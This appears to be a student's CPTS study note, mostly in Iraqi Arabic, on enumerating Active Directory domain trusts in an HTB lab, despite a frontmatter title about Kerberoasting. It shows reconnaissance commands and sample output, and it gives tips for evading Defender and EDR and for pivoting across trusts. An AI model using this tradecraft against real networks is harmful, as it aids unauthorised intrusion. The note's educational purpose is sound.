---
title: "SEC-21: ACL Abuse — Kerberoasting via Fake SPN"
module: "Active Directory Privilege Escalation"
section_num: 21
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - ActiveDirectory
  - Kerberoasting
  - ACLAbuse
  - FakeSPN
difficulty: "Medium"
vectors: "ACL Abuse · Kerberos TGS"
tools: "PowerView · Rubeus · Impacket · Hashcat"
status: "🟢 Complete"
date: 2026-08-02
---

> [!abstract] ⚙ T4E · التقنية للجميع · CPTS CERTIFICATION PATHWAY
> 
> |📍 TARGET NODE|🔐 ACCESS LEVEL|📡 ATTACK VECTOR|📋 SECTION ID|
> |:-:|:-:|:-:|:-:|
> |`10.129.84.16 — INLANEFREIGHT.LOCAL`|`Authenticated User (Foothold)`|`ACL Abuse / Kerberos TGS`|`SEC-21`|
> 
> |🛠️ KEY TOOLS|⚡ DIFFICULTY|🎯 CORE OBJECTIVE|📅 DATE|
> |:-:|:-:|:-:|:-:|
> |`PowerView · Rubeus · Impacket · Hashcat`|`🟡 Medium`|`Weaponize GenericAll for Kerberoasting`|`2026-08-02`|

`PHASE_I: النظرية` → `PHASE_II: المختبر والطرق الستة` → `PHASE_III: الدليل والمصطلحات`

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-21 // ACL Abuse — Kerberoasting via Fake SPN      ║
║  [DOMAIN]   :: INLANEFREIGHT.LOCAL · 10.129.84.16                    ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!tip] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD **Language:** Arabic — **Size:** ~2,000 Words **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

---

تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

  

━━━━━

  

### 🟢 المرحلة 0: Big Picture — ليش هذا الموضوع (Domain Trusts) موجود أصلاً؟

تخيل وياي هذا السيناريو من العالم الحقيقي: شركة اتصالات عراقية جبيرة (نسميها شركة أ) قررت تشتري شركة إنترنت صغيرة (نسميها شركة ب) حتى توسع شغلها. هسة، موظفين شركة (ب) يحتاجون يدخلون على سيرفرات وملفات شركة (أ)، وموظفين شركة (أ) يحتاجون يديرون أنظمة شركة (ب).

  

بوضع طبيعي، قسم الـ IT راح ينجلط! لازم يمسحون كل حسابات الموظفين بشركة (ب)، ويرجعون يسوون إلهم حسابات جديدة بأنظمة شركة (أ)، وينقلون كل الملفات والسيرفرات... هاي عملية تاخذ أشهر، وممكن توكف الشغل تماماً.

  

**ليش هاي التقنية (Trusts) موجودة؟**

مايكروسوفت وفرت حل سحري اسمه الـ "الثقة" (Trust). بدل ما ننقل الحسابات، شركة (أ) تكول لنظامها: "اسمع، أي هوية (باج) تجي من شركة (ب)، اعتبرها صحيحة وموثوقة ودخلهم". هنا، النظامين ربطوا شبكاتهم وصاروا يتبادلون الـ Authentication (المصادقة) بدون ما يغيرون أي شي بالبنية التحتية.

  

**وين يظهر هذا الخلل بالواقع؟** هذا مو "خلل" برمجي، هذا "تصميم" (By Design). المشكلة تصير لمن شركة (أ) تكون حامية نفسها بمليون جدار حماية (Firewalls, EDR, SIEM)، بس شركة (ب) اللي اشتروها أمانها ضعيف جداً (الباسوردات سهلة ومو محدثين أنظمتهم). الهاكرز (وإنت كـ Pentester) شراح يسوون؟ يعوفون الشركة القوية (أ)، يخترقون الشركة الضعيفة (ب)، وبما إنو اكو "Trust" (ثقة) بيناتهم... الهاكر راح يستخدم حسابات الشركة الضعيفة حتى يعبر للشركة القوية! هذا يسموه "End-around attack" أو الهجوم الالتفافي.

  

**وين هذا السكشن يقع بخريطة CPTS؟**

إنت هسة بمرحلة ما بعد الاختراق الأولي (Post-Exploitation) وتحديداً بمرحلة الـ Active Directory Enumeration. إنت اوردي داخل شبكة، وحصلت موطئ قدم (Foothold)، وهسة دتدور بالخريطة: "يا ترى، هاي الشركة مرتبطة بشركات ثانية أكدر أطفر عليها؟".

  

**شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟**

  

1. راح تكدر ترسم خريطة كاملة لكل الشركات والفروع المرتبطة بالهدف مالتك.
    
      
    
2. راح تفهم منو يكدر يدخل على منو (اتجاه الثقة).
    
      
    
3. راح تعرف تستخدم أدوات مثل PowerView و netdom حتى تسحب هاي المعلومات بصمت.
    
      
    

━━━━━

  

### 🔵 المرحلة 1: خريطة المفاهيم

هاي أهم المصطلحات الجديدة اللي وردت بالسكشن، مبسطة حتى تفهمها كأنها قصة:

  

**Forest (الغابة)**

  

- **شنو يعني بالعراقي؟** الغابة هي أكبر حاوية (Container) ببيئة الويندوز. تخيلها هي "المجموعة القابضة" اللي تمتلك عدة شركات. كل الغابة تشترك بأساسيات وحدة.
    
      
    
- **مثال:** مجموعة شركات "المنصور" (الغابة)، بداخلها شركة مقاولات، وشركة تجارة، وشركة سياحة.
    
      
    

**Domain (المجال)**

  

- **شنو يعني بالعراقي؟** هو الدومين الواحد أو الشركة الواحدة داخل الغابة. كل دومين إله مديره الخاص ومستخدمينه.
    
      
    
- **مثال:** دومين `corp.inlanefreight.local` هو دومين فرعي (شركة فرعية) تابع للدومين الأساسي.
    
      
    

**Trust (الثقة)**

  

- **شنو يعني بالعراقي؟** الجسر أو الاتفاقية بين دومين ودومين ثاني. هي اللي تسمح ليوزر من الدومين الأول إنو يثبت هويته بالدومين الثاني.
    
      
    
- **وين يظهر؟** يظهر كعلاقة برمجية (Object) داخل الـ Active Directory إسمه `trustedDomain`.
    
      
    

**Transitive Trust (الثقة المتعدية)**

  

- **شنو يعني بالعراقي؟** قانون "صديق صديقي هو صديقي". إذا دومين (أ) يثق بـ (ب)، و (ب) يثق بـ (ج)... إذن (أ) يثق بـ (ج) تلقائياً.
    
      
    
- **مثال:** إذا إنت مسجل اسمك يم حرس الباب الخارجي (أ)، والحرس الخارجي يثق بحرس الطابق الأول (ب)... إذن تكدر تصعد للطابق الأول بدون ما تسجل اسمك مرة ثانية.
    
      
    

**Non-Transitive Trust (الثقة غير المتعدية)**

  

- **شنو يعني بالعراقي؟** قانون "الثقة محصورة بيك إنت وبس". لا تجيب أصدقائك وياك. إذا (أ) يثق بـ (ب)، و (ب) يثق بـ (ج)... (أ) **لا** يثق بـ (ج).
    
      
    

**Bidirectional Trust (الثقة ثنائية الاتجاه)**

  

- **شنو يعني بالعراقي؟** طريق ذو اتجاهين (رايح راجع). مستخدمين دومين (أ) يكدرون يروحون لـ (ب)، ومستخدمين (ب) يكدرون يروحون لـ (أ).
    
      
    

**Intra-domain / Forest-forest**

  

- **شنو يعني بالعراقي؟** `Intra-domain` يعني الثقة بين دومينات اثنين بنفس الغابة (إخوان). `Forest-forest` يعني ثقة بين غابتين مختلفات تماماً (شركتين ما إلهم علاقة ببعض سابقاً).
    
      
    

━━━━━

  

### 🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 **موضوع السكشن:** أساسيات ثقة النطاقات (Domain Trusts Primer). هذا جزء أساسي من فهم بيئات الشركات المعقدة (Enterprise Environments) بمسار CPTS.

  

🎯 **ماذا يريد هذا السكشن أن تتعلم؟**

  

- أن تفهم كيف تتصل الدومينات ببعضها ولماذا.
    
      
    
- أن تميز بين أنواع الثقة (اتجاهها وتعديتها) لأنها تحدد مسار هجومك.
    
      
    
- أن تستخرج (Enumerate) علاقات الثقة باستخدام أدوات مختلفة (PowerShell, PowerView, netdom).
    
      
    

📐 **هيكل المحتوى (Section Blueprint):**

  

```
[مفهوم الثقة ولماذا تستخدم؟ (M&A, MSP)]
       │
       ▼
[أنواع الثقة الستة (Parent-child, Forest, الخ)]
       │
       ▼
[قوانين الثقة: Transitive و Directional]
       │
       ▼
[التطبيق العملي 1: استخراج الثقة بـ Get-ADTrust]
       │
       ▼
[التطبيق العملي 2: استخراج الثقة بـ PowerView]
       │
       ▼
[التطبيق العملي 3: أوامر netdom القديمة والفعالة]
```

🔗 **المتطلبات السابقة:**

لازم تكون فاهم شنو يعني Active Directory وشنو يعني Domain و Domain Controller (DC).

  

🚪 **ما يُفتح بعده:**

هذا السكشن يفتح الباب لهجمات خطيرة جداً مثل: Kerberoasting عبر الثقة (Across Trusts)، أو استغلال ثغرة بدومين ضعيف للقفز إلى الدومين الرئيسي (Enterprise Admin).

  

⚠️ **افتراضات مخفية بالسكشن:**

السكشن يفترض إنك تفهم إن "الثقة" (Trust) ما تنطيك صلاحيات (Permissions) كأدمن فوراً. الثقة تنطيك بس الـ Authentication (يعني يسمحولك تفوت للباب)، بس هل مسموحلك تفتح الخزنة؟ هذا يعتمد على الـ Permissions. هذا فخ يوكعون بيه هواية مبتدئين.

  

━━━━━

  

### 🟠 المرحلة 3: الشرح العميق

هنا راح نفلش السكشن قطعة قطعة، ركز وياي.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم الأول: شنو هي الثقة وأنواعها؟ (Trust Types)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 **بالعراقي البسيط:** الشركات الكبيرة ما تتكون من سيرفر واحد ودومين واحد. تكون مقسمة. مرات يشترون شركات ثانية، ومرات يسوون دومين خاص بس للمطورين (dev.company.com). حتى هاي الدومينات تحجي ويا بعض، يسوون "Trust". اكو ٦ أنواع من هاي الثقة لازم تعرفها لأنها تحدد خريطة طريقك للاختراق.

  

🎭 **التشبيه:**

تخيل الغابة (Forest) هي عمارة سكنية. الدومين الرئيسي هو صاحب العمارة. الدومينات الفرعية هم ولده اللي ساكنين وياه. إذا واحد من ولده اتزوج وجاب عائلته... شلون ينظمون منو يدخل شقة منو؟ هاي هي الـ Trusts.

  

🔬 **ليش يعمل هيج؟ (أنواع الثقة):**

  

1. **Parent-child (أب وابنه):** الدومين الرئيسي `htb.local` والدومين الفرعي `dev.htb.local`. ثقة **ثنائية ومتعدية** دائماً بالوراثة.
    
      
    
2. **Cross-link (اختصار الطريق):** مرات ابنين بنفس الغابة يحتاجون يحجون هواي ويا بعض. بدل ما يروحون للأب كل شوية (ياخذ وقت بالـ authentication)، يفتحون طريق مباشر بيناتهم.
    
      
    
3. **External (خارجي):** شركة تسوي ثقة ويا شركة ثانية برا الغابة تماماً. هاي دائماً **غير متعدية (Non-transitive)** لحماية الأمن.
    
      
    
4. **Tree-root:** غابة وحدة، بس بيها شجرتين بأسامي مختلفة تماماً (مثلاً `htb.local` و `academy.local` بس ثنينهم بغابة وحدة). ثقة **متعدية وثنائية**.
    
      
    
5. **Forest (بين غابتين):** ثقة **متعدية** بين غابتين مختلفات تماماً (مثل ما يصير بدمج الشركات).
    
      
    
6. **ESAE (غابة الإدارة):** غابة معزولة تماماً بس للـ Admins (يسموها Bastion) حتى يديرون منها، هاي قصة متقدمة جداً.
    
      
    

❓ **الـ "بس ليش؟":** ليش ما يسوون كل شي دومين واحد ونفضها؟

لأن الشركات الجبيرة تحتاج عزل. فرع الشركة بلندن ما يصير يتأثر إذا فرع بغداد وكع. وأيضاً لأسباب قانونية وإدارية تخص كل دولة أو قسم.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم الثاني: قوانين انتقال الثقة (Transitivity & Direction)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 **بالعراقي البسيط:** الثقة بيها شرطين: هل هي تمتد لأطراف أخرى؟ (Transitive) وبأي اتجاه تمشي؟ (Direction). هذا يحدد إذا كدرت تخترق سيرفر، وين تكدر تروح بعده.

  

🔬 **ليش يعمل هيج؟:**

  

**1. الـ Transitivity (التعدية):** السكشن جاب مثال توصيل الطرود. إذا الثقة متعدية (Transitive): معناها تكول لموظف التوصيل "انطي الباكيت لأي واحد من أهلي بالبيت وهو يوصله إلي". بالشبكات: `A=B` و `B=C` إذن `A=C`.

  

Plaintext

```
رسم توضيحي للـ Transitive Trust:

      [Domain A]
         /\
        /  \  <-- ثقة مباشرة
       /    \
 [Domain B]---[Domain C]
       ^-- ثقة متعدية (A يثق بـ C عبر B)
```

إذا الثقة غير متعدية (Non-Transitive): تكول للموظف "لا تنطي الباكيت لأي بشر غيري، حصراً بإيدي". يعني `A` يثق بـ `B`، بس ما يعترف بـ `C` أبد.

  

**2. الـ Directionality (الاتجاه):**

  

- **One-way (اتجاه واحد):** `A` يثق بـ `B`. هذا معناه يوزرات `B` يگدرون يدخلون على موارد `A`. (تذكر: الثقة عكس اتجاه الدخول).
    
      
    
- **Two-way / Bidirectional (اتجاهين):** الكل يثق بالكل والكل يدخل على الكل.
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم الثالث: استخراج الثقة باستخدام Get-ADTrust

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 **بالعراقي البسيط:** هسة نجي للعملي. إنت اخترقت جهاز موظف عادي بالشركة. أول شي تريده هو تشوف خريطة الشركة. أداة `Get-ADTrust` هي أداة مبنية داخل الـ PowerShell الخاص بالـ Active Directory (ما تحتاج تنزل أدوات هكر وتنكشف).

  

🔧 **الأمر:**

  

PowerShell

```
Import-Module activedirectory
Get-ADTrust -Filter *
```

💬 **شرح الأمر:**

  

- `Import-Module activedirectory`: يحمّل مكتبة الأوامر الخاصة بإدارة الـ AD.
    
      
    
- `Get-ADTrust`: هو الأمر اللي يجيبلك علاقات الثقة.
    
      
    
- `-Filter *`: يعني "جيبلي كل الثقات الموجودة، لا تستثني شي".
    
      
    

📤 **الـ Output المتوقع (مأخوذ من السكشن):**

  

Plaintext

```
Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType               : Uplevel
```

🔍 **كيف تقرأ الـ Output؟ (هذا أهم شي):**

  

- `Direction: BiDirectional`: يعني الطريق مفتوح بالاتجاهين.
    
      
    
- `IntraForest: True`: هذا السطر السري! بما إنه `True`، يعني هذا الدومين (LOGISTICS) هو **جزء من نفس الغابة** مالتنا (يعني هو Child domain).
    
      
    
- `ForestTransitive: False`: طبعاً راح يكون False، لأن هذا مو دومين بغابة ثانية، هذا ويانا بنفس الغابة.
    
      
    
- `Target`: هذا اسم الدومين اللي بينا وبينه الثقة.
    
      
    

⏸️ **نقطة توقف — ماذا فهمنا لحد هسة؟:**

بأمر واحد نظيف من داخل الويندوز، كشفنا إن شركتنا `INLANEFREIGHT` عدها ابن اسمه `LOGISTICS`، والطريق بيناتهم مفتوح رايح راجع.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم الرابع: استخراج الثقة باستخدام PowerView

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 **بالعراقي البسيط:** مرات الـ PowerShell العادي ما بي موديول الـ Active Directory (لأن الموظف العادي ما يحتاجه). هنا نستخدم أداة خارجية رهيبة اسمها PowerView (سكربت خاص بالـ Pentesters).

  

🔧 **الأوامر:**

  

PowerShell

```
# لجلب الثقات للدومين الحالي
Get-DomainTrust 

# لرسم خريطة كاملة لكل الثقات بالغابة
Get-DomainTrustMapping
```

💬 **شرح الـ flags:**

هاي الدوال بـ PowerView ما تحتاج فلاتر معقدة، هي مصممة تجيبلك الزبدة مباشرة.

  

📤 **الـ Output المتوقع:**

  

Plaintext

```
SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
```

🔍 **كيف تقرأ الـ Output؟:**

شوف شكد أرتب من الأداة السابقة؟

  

- `SourceName`: إنت وين هسة.
    
      
    
- `TargetName`: الدومين الهدف.
    
      
    
- `TrustAttributes`: هنا كاتب `FOREST_TRANSITIVE`. هذا يعني `FREIGHTLOGISTICS` هي غابة (شركة ثانية تماماً) مو ويانا بنفس الغابة، والثقة بيناتنا متعدية! هذا كنز للهاكر.
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم الخامس: أوامر netdom القديمة والفعالة

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 **بالعراقي البسيط:** مرات الانظمة تكون قديمة، أو الـ PowerShell مقفول ومراقب بشدة. تلجأ للـ Command Prompt (CMD) العادي وتستخدم أداة قديمة اسمها `netdom` موجودة بالويندوز من أيام جدو.

  

🔧 **الأوامر:**

  

DOS

```
:: لمعرفة الثقات
netdom query /domain:inlanefreight.local trust

:: لمعرفة الدومين كونترولرز (السيرفرات الرئيسية)
netdom query /domain:inlanefreight.local dc

:: لمعرفة الأجهزة العادية والسيرفرات
netdom query /domain:inlanefreight.local workstation
```

💬 **شرح الـ flags:**

  

- `query`: نسأل الأداة تجيب معلومات.
    
      
    
- `/domain:`: نحدد يا دومين نريد نسأله (إذا ما كتبناه، يسأل الدومين اللي إنت بيه هسة).
    
      
    
- `trust / dc / workstation`: نوع المعلومة اللي نريدها (ثقات، متحكمات، أجهزة).
    
      
    

📤 **الـ Output المتوقع للثقات:**

  

Plaintext

```
Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========
<->       LOGISTICS.INLANEFREIGHT.LOCAL                   Direct
<->       FREIGHTLOGISTICS.LOCAL                          Direct
```

🔍 **كيف تقرأ الـ Output؟:** علامة `<->` تعني Bidirectional (اتجاهين). أداة بسيطة جداً بس تنطيك نظرة سريعة ممتازة.

  

📊 **ملخص ما تعلمنا عملياً:**

  

|**الأداة**|**الأمر**|**متى تستخدمه**|
|---|---|---|
|Built-in PS|`Get-ADTrust -Filter *`|إذا كان RSAT/AD Module متوفر بالجهاز ومسموح|
|PowerView|`Get-DomainTrustMapping`|أفضل أداة للـ Pentesters، تنطي خريطة كاملة ونظيفة|
|CMD|`netdom query ... trust`|إذا PowerShell مقفول أو تدور على بديل LoLBin موجود بالنظام|
|BloodHound|`Map Domain Trusts` query|إذا ردت تشوف الموضوع كـ رسمة بصرية (Graph) تسهل الفهم|

━━━━━

  

### 🔴 المرحلة 4: ما لا يقوله السكشن

هنا الشغلات اللي بالواقع تختلف عن اللابات، واللي الـ HTB يفترض إنك تعرفها:

  

🕳️ **الثغرات في شرح السكشن:**

  

1. **الـ Permissions مقابل الـ Authentication:** السكشن يكول "الثقة تسمح للمستخدمين بالوصول للموارد". هذا مو دقيق ١٠٠٪. الثقة تسمح إلك إنك **تثبت هويتك** (Authentication) بالدومين الثاني. بس هل تكدر تقرأ ملفات؟ هذا يعتمد على الـ **Permissions** (Authorization). يعني ممكن اكو Trust، بس ماكو ولا يوزر عنده صلاحية يعبر للجهة الثانية.
    
      
    
2. **SID Filtering:** السكشن ذكرها بشكل عابر بنقطة الـ External Trust. الـ SID Filtering هو حماية تمنع مستخدم من دومين فرعي إنه يزور هويته ويكول "أنا Enterprise Admin بالدومين الرئيسي". هاي الحماية تشتغل باي ديفولت بالثقات الخارجية.
    
      
    

⚠️ **الـ Gotchas عند تطبيق هذا بالـ Lab:**

  

- **PowerView ينكشف فوراً:** باللابات ممكن تشغله عادي، بس بالواقع (Real Pentest)، مجرد ما تسوي `Import-Module PowerView.ps1`، برنامج الـ Windows Defender راح يحذف الملف ويبلغ الـ SOC. بالواقع تحتاج تستخدم تقنيات Obfuscation أو تعتمد على الأدوات المدمجة مثل `netdom` أو الـ AD Module.
    
      
    
- **Get-ADTrust ما يشتغل؟:** مو كل جهاز ويندوز بالشركة يكدر يشغل هذا الأمر. لازم الجهاز يكون منزل عليه حزمة اسمها RSAT (Remote Server Administration Tools). إذا كنت مخترق جهاز سكرتيرة، غالباً الأمر ما راح يشتغل، وراح تضطر تستخدم أداة مثل `netdom`.
    
      
    

🌍 **السياق الحقيقي (Real Pentest Context):** ليش احنا كـ هكرز ندور Trusts؟ السيناريو الذهبي هو: شركة اتصالات جبيرة (Target) حمايتها حديد. تروح بالـ LinkedIn تكتشف إنهم قبل ٥ سنين اشتروا شركة صغيرة مال تسويق. الشركة الصغيرة دومينها متروك، ما بيه MFA، واليوزرات باسورداتهم ضعيفة. تخترق الشركة الصغيرة، ومن خلال الـ Two-way Trust اللي نسوا يلغوها، تسحب هاشات (Kerberoasting) من الشركة الجبيرة وتخترقهم. هذا اللي قصده كاتب السكشن بـ "End-around attack".

  

🏆 **النصيحة الذهبية للـ CPTS Exam:** بامتحان الـ CPTS، من تحصل أول يوزر بأي دومين، **أول خطوة** قبل لا تحاول تصعد صلاحياتك (PrivEsc) بنفس الجهاز، افتح BloodHound وشوف الـ "Map Domain Trusts". الامتحان مصمم بحيث يخليك تتنقل بين عدة دومينات (Pivoting). لا تضيع وقتك تضرب راسك بحايط بدومين واحد إذا جان الطريق مفتوح لدومين ثاني أسهل.

  

━━━━━

  

### 💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: ما هو الفرق بين Transitive Trust و Non-Transitive Trust؟

✅ Back:

Transitive (متعدية): الثقة تمتد لأطراف أخرى (إذا A يثق بـ B، و B يثق بـ C، فإن A يثق بـ C).

Non-Transitive: الثقة محصورة بين الطرفين فقط (A لا يثق بـ C).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: ماذا تعني الثقة ثنائية الاتجاه (Bidirectional Trust)؟

✅ Back: كلا النطاقين يثقان ببعضهما، ومستخدمو كلا النطاقين يمكنهم المصادقة والوصول إلى موارد النطاق الآخر (إذا كانت لديهم الصلاحيات).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: ما هو الـ "End-around attack" في سياق Domain Trusts؟

✅ Back: اختراق نطاق فرعي أو شركة مستحوذ عليها (أقل أماناً) للحصول على موطئ قدم أو وصول إداري في النطاق الرئيسي للشركة الهدف.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: أي أمر PowerShell مدمج نستخدمه لاستخراج الثقات (Trusts)؟

✅ Back: `Get-ADTrust -Filter *` (يتطلب توفر وحدة ActiveDirectory).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

❓ Front: كيف نستخرج خريطة الثقات باستخدام PowerView؟

✅ Back: `Get-DomainTrustMapping`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: ما هي الأداة المدمجة في CMD (وليس PowerShell) لاستخراج الثقات؟

✅ Back: `netdom query /domain:<domain_name> trust`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: في BloodHound، ما هو الاستعلام (Query) الجاهز لرؤية العلاقات بين النطاقات؟

✅ Back: استعلام "Map Domain Trusts" من قائمة الـ Pre-Built Analytics Queries.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

━━━━━

  

### 📄 ورقة غش السكشن — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: Domain Trusts Enumeration

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🎯 **هدف هذا السكشن بجملة:**

تحديد خريطة النطاقات (Domains) المرتبطة بالهدف ومعرفة اتجاه وتعدية الثقة للبحث عن مسارات اختراق أسهل عبر النطاقات (Cross-Domain Attacks).

  

⚔️ **خوارزمية التطبيق:**

  

1. أحصل على موطئ قدم (أي يوزر عادي بالدومين).
    
      
    
2. استخدم الأدوات المدمجة أولاً (لتجنب الحماية): `Get-ADTrust` أو `netdom`.
    
      
    
3. إذا فشلت، قم بتحميل PowerView للذاكرة واستخدم دواله.
    
      
    
4. استخدم BloodHound للحصول على رؤية بصرية كاملة (Map Domain Trusts).
    
      
    
5. حدد الدومينات المرتبطة بثقة (Bidirectional) وحاول تطبيق هجمات مثل Kerberoasting عليها.
    
      
    

📐 **جدول الأوامر الأساسية لهذا السكشن:**

  

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|استخراج الثقات بـ AD Module|`Get-ADTrust -Filter *`|يعتمد على وجود RSAT بالويندوز|
|خريطة الثقات بـ PowerView|`Get-DomainTrustMapping`|ينطي كل الثقات بالـ Forest وممتاز كـ Output|
|استخراج ثقات الدومين الحالي بـ PV|`Get-DomainTrust`|سريع ومباشر لدومينك الحالي فقط|
|استخراج الثقات بـ CMD|`netdom query /domain:X trust`|X هو اسم الدومين، أداة قديمة وتتجاوز أغلب الـ EDR|
|البحث عن يوزرات بدومين ثاني|`Get-DomainUser -Domain X.local`|ممتاز للبحث عن أهداف بدومين الطفل (Child)|

🚨 **الفخوخ الخاصة بهذا السكشن:**

❌ افتراض أن الثقة (Trust) تعني وصول كمسؤول (Admin) تلقائياً. الثقة تعطي حق المصادقة (Auth) فقط، الصلاحيات قصة أخرى.

❌ محاولة استخدام PowerView مباشرة على قرص صلب لجهاز محمي (راح ينحذف فوراً بواسطة الـ AV).

❌ تجاهل النطاقات الفرعية (Child domains) أو الشركات المندمجة حديثاً والتركيز فقط على النطاق الرئيسي. غالباً الفرعي أسهل بالاختراق.

  

💡 **Golden Tip:**

بالاختبارات الحقيقية وامتحانات HTB، ركز دائماً على خاصية `IntraForest` و `ForestTransitive` في مخرجات الاستطلاع. إذا رأيت `Bidirectional` مع نطاق آخر، اعتبره سطح هجوم (Attack Surface) جديد لك وابدأ بجمع بياناته!

  

━━━━━

  

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

  

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_I EXTRACTION COMPLETE
  [✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
  [→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!danger] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT **Language:** English — **Size:** ~2,000 Words **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

---

# 🛡️ Domain Trusts Primer — Complete Beginner-to-Professional Guide

---

## 🧠 BEFORE WE BEGIN: Core Concepts You MUST Understand

Think of a **Domain Trust** like a diplomatic agreement between two countries. Country A (Domain A) says: *"I trust Country B's passports."* This means citizens of Country B can use their credentials to access resources in Country A.

| Concept | Simple Analogy |
|---|---|
| **Domain** | A country with its own government (Domain Controller) |
| **Trust** | A diplomatic agreement between countries |
| **Transitive Trust** | If A trusts B, and B trusts C → A automatically trusts C |
| **Non-Transitive** | A trusts B. B trusts C. A does NOT trust C. |
| **Bidirectional** | Both countries accept each other's passports |
| **One-Way (Inbound)** | Only YOUR users can go to THEIR domain |
| **One-Way (Outbound)** | Only THEIR users can come to YOUR domain |
| **Parent-Child Trust** | HQ (parent) and Branch Office (child) — always auto-created, bidirectional, transitive |
| **Forest Trust** | Two completely separate corporate empires shaking hands |

---

# 1️⃣ THE QUESTION & SYSTEMATIC THOUGHT PROCESS

## Re-stating the Questions Simply

You are logged into a Windows machine (`ACADEMY-EA-MS01` at `10.129.111.130`) inside an Active Directory environment. Your mission is to **map out the trust relationships** of the domain `INLANEFREIGHT.LOCAL` and answer:

- **Q1:** What **child domain** exists under `INLANEFREIGHT.LOCAL`? *(A child domain is like a sub-department of the same company)*
- **Q2:** What **external forest** does `INLANEFREIGHT.LOCAL` have a **forest transitive trust** with? *(A completely separate company/domain that they've formally trusted)*
- **Q3:** What **direction** is that forest trust? *(Who trusts whom? Both ways? One way?)*

## The Hacker's Mindset 🧠

When a penetration tester lands inside an AD environment, trust relationships are **GOLD**. Here's why:

```
If INLANEFREIGHT.LOCAL trusts FREIGHTLOGISTICS.LOCAL
→ A compromised account in FREIGHTLOGISTICS might have access inside INLANEFREIGHT
→ Or vice versa — you can pivot between entire forests!
```

**The attack chain logic:**
1. First, **enumerate** what trusts exist (reconnaissance)
2. Understand the **direction** (who can reach whom)
3. Understand the **type** (transitive? can we hop further?)
4. Look for **privileged users** that exist in trusted domains
5. **Exploit** the trust to move laterally or escalate privileges

## Why These Specific Tools?

The tools we'll use fall into two categories:

